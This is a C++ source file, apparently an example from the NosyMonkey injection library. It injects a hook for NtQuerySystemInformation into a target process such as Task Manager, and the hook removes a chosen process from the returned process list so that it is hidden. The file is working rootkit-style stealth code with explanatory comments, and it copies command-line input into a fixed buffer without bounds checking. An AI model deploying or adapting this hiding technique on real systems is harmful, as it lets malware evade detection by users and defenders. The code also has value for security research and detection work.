#include "debug.hpp"
#include "../../include/nosymonkey.hpp"
#include <Winternl.h>

typedef LONG KPRIORITY;

typedef struct _SYSTEM_THREADS {
    LARGE_INTEGER  KernelTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  CreateTime;
    ULONG          WaitTime;
    PVOID          StartAddress;
    CLIENT_ID      ClientId;
    KPRIORITY      Priority;
    KPRIORITY      BasePriority;
    ULONG          ContextSwitchCount;
    LONG           State;
    LONG           WaitReason;
} SYSTEM_THREADS, *PSYSTEM_THREADS;

typedef struct _VM_COUNTERS {
#ifdef _WIN64
    SIZE_T         PeakVirtualSize;
    SIZE_T         PageFaultCount;
    SIZE_T         PeakWorkingSetSize;
    SIZE_T         WorkingSetSize;
    SIZE_T         QuotaPeakPagedPoolUsage;
    SIZE_T         QuotaPagedPoolUsage;
    SIZE_T         QuotaPeakNonPagedPoolUsage;
    SIZE_T         QuotaNonPagedPoolUsage;
    SIZE_T         PagefileUsage;
    SIZE_T         PeakPagefileUsage;
    SIZE_T         VirtualSize;
#else
    SIZE_T         PeakVirtualSize;
    SIZE_T         VirtualSize;
    ULONG          PageFaultCount;
    SIZE_T         PeakWorkingSetSize;
    SIZE_T         WorkingSetSize;
    SIZE_T         QuotaPeakPagedPoolUsage;
    SIZE_T         QuotaPagedPoolUsage;
    SIZE_T         QuotaPeakNonPagedPoolUsage;
    SIZE_T         QuotaNonPagedPoolUsage;
    SIZE_T         PagefileUsage;
    SIZE_T         PeakPagefileUsage;
#endif
} VM_COUNTERS;

typedef struct _SYSTEM_PROCESSES {
    ULONG            NextEntryDelta;
    ULONG            ThreadCount;
    ULONG            Reserved1[6];
    LARGE_INTEGER   CreateTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   KernelTime;
    UNICODE_STRING  ProcessName;
    KPRIORITY        BasePriority;
    ULONG            ProcessId;
    ULONG            InheritedFromProcessId;
    ULONG            HandleCount;
    ULONG            Reserved2[2];
    VM_COUNTERS        VmCounters;
#if _WIN32_WINNT >= 0x500
    IO_COUNTERS        IoCounters;
#endif
    SYSTEM_THREADS  Threads[1];
} SYSTEM_PROCESSES, *PSYSTEM_PROCESSES;

void usage(char *arg1)
{
    string sExec(arg1);
    sExec = sExec.substr(sExec.find_last_of('\\')+1);
    cout << "Hide a process by hooking NtQuerySystemInformation." << endl << endl;
    cout << "By Alex Popovici, part of NosyMonkey's examples (@alex91dotar) github.com/alex91ar" << endl;
    cout << "----------------------------------------------------------------------------------" << endl << endl;
    cout << sExec << " [target process] [process to hide]" << endl << endl;
    cout << "Try taskmgr.exe as your target process."  << endl << endl;
    ExitProcess(1);
}
char pszProcessHidden[256];

/*
This is a good example of how to /avoid/ using local functions (i.e. those that are statically linked to your main module) and instead use equivalents
which can be referenced by Nosymonkey on your target process.
I wrote this before I implemented support for local functions, but the idea remains the same:

pszProcessHidden is a global variable, which is copied into the target executable by Nosymonkey.

We place the hook on the function NtQuerySystemInformation from ntdll.dll. This function is an "NT" function
which means that it does a context switch (via a system call), thus we can use direct system calling to restore the flow of execution.

This function is called by Taskmgr.exe to get the list of executables, we then traverse the list, compare the process names and hide
the one that we want.

Note that:
- originalCall() is used as a placeholder to call the original version of NtQuerySystemInformation, this is a dummy function that will be replaced.
- MultyByteToWideChar() is used to convert pszProcessHidden to UNICODE, as NtQuerySystemInformation returns wide-char strings.
- LocalAlloc()/LocalFree() are used instead of the new operator or malloc(), which are both locally referenced.
- CompareStringW() is used instead of wcscmp() for the same reason.

Also, since we're not using local function calls, we can just call setCopyDepth(0), to reduce the final shellcode size and skip that part of the process.

*/

uintptr_t NtQuerySystemInformationHook(uintptr_t SystemInformationClass,uintptr_t SystemInformation,uintptr_t SystemInformationLength,uintptr_t ReturnLength)
{
    uintptr_t ntOut = originalCall(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength); //Call the original NtQuerySystemInformation via direct system call.
    if(ntOut == 0 && SystemInformationClass == SystemProcessInformation)
    {
        //The operator "New" points to a statically linked function so, can't use it. LocalAlloc works though.
        wchar_t *pwszTemp = (wchar_t *) LocalAlloc(LMEM_ZEROINIT, sizeof(wchar_t)*256);
        //Global variables are referenced via relative PTR instructions.
        MultiByteToWideChar(CP_UTF8, MB_PRECOMPOSED, pszProcessHidden, -1, pwszTemp, 256*sizeof(wchar_t));
        PSYSTEM_PROCESSES infoP = (PSYSTEM_PROCESSES)SystemInformation;
        PSYSTEM_PROCESSES lastInfoP = NULL;
        while(infoP) //The logic looks wonky but it works.
        {
            lastInfoP = infoP;
            infoP = (PSYSTEM_PROCESSES)(((LPBYTE)infoP) + infoP->NextEntryDelta); //The first one is always "System" so we can skip it.
            //Can't use wcscmp because it looks like it's statically built.
            //CompareStringW is from kernel32.dll so it should be fine to call.
            if(CompareStringW(LOCALE_USER_DEFAULT, LINGUISTIC_IGNORECASE, infoP->ProcessName.Buffer, -1, pwszTemp, -1) == CSTR_EQUAL)
            {
                if(infoP->NextEntryDelta)
                {
                    //We need to tell the list that the next item is referenced after the one we want to hide.
                    ULONG newEntryDelta = lastInfoP->NextEntryDelta + infoP->NextEntryDelta;
                    //We go back to the previous one.
                    infoP = (PSYSTEM_PROCESSES)(((LPBYTE)infoP) - lastInfoP->NextEntryDelta);
                    lastInfoP->NextEntryDelta = newEntryDelta;
                }
                else lastInfoP->NextEntryDelta = 0;
            }
            if (!infoP->NextEntryDelta) break;
        }
        LocalFree(pwszTemp);
    }
    return ntOut;
}

int main(int argc, char **argv)
{
    if(argc != 3) usage(argv[0]);
    setCopyDepth(0);
    strcpy(pszProcessHidden, argv[2]);
    DWORD dwPid = getProcessId(argv[1]);
    if(dwPid)
    {
        cout << "Hiding process " << pszProcessHidden << endl;
        if(hookAPIDirectSyscall(dwPid, (LPVOID)NtQuerySystemInformationHook, "NtQuerySystemInformation"))
        {
            return 0;
        }
    }
    return 1;
}
